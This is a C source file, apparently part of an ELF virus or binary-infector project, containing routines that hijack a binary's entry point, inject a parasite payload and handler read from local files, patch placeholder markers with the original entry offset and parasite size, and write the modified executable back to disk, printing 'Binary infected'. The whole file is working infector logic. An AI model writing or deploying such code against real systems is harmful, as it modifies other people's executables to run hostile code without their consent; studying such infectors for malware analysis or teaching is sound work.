#include "elf.h"

void patcher(unsigned char *ptr_injection, Elf64_Addr old_entry, t_elf_data *elf_data)
{
    /* TEST */
    for (size_t i = 0; i <= elf_data->g_payload_size - sizeof(uint64_t); i++) 
    {
        uint64_t *ptr = (uint64_t *)(ptr_injection + i);
        if (*ptr == 0xAAAAAAAAAAAAAAAA) 
        {
            *ptr = (int64_t)old_entry - (int64_t)elf_data->g_handler_addr;
            printf("Old entry patched at offset %lu\n", i);
        }
        if (*ptr == 0xBBBBBBBBBBBBBBBB) 
        {
            *ptr = elf_data->g_parasite_size;
            printf("Parasite size patched at offset %lu\n", i);
        }
    }
    /* TEST */
    return;
}

void injection(Elf64_Ehdr *eh, void *base, size_t size, t_elf_data *elf_data)
{
    unsigned char *ptr_injection;
    Elf64_Addr old_entry;
    int vfd;

    old_entry = eh->e_entry;
    eh->e_entry = elf_data->g_handler_addr;

    ptr_injection = (unsigned char *)base + elf_data->g_parasite_off;

    vfd = open("obj/assembly/virus_test.bin", O_RDONLY);
    read(vfd, ptr_injection, elf_data->g_parasite_size);
    close(vfd);

    vfd = open("obj/assembly/handler_test.bin", O_RDONLY);
    read(vfd, ptr_injection + elf_data->g_parasite_size, elf_data->g_payload_size - elf_data->g_parasite_size);
    close(vfd);

    patcher(ptr_injection, old_entry, elf_data);

    msync(base, size, MS_SYNC);
    munmap(base, size);
    printf("Binary infected\n");
}
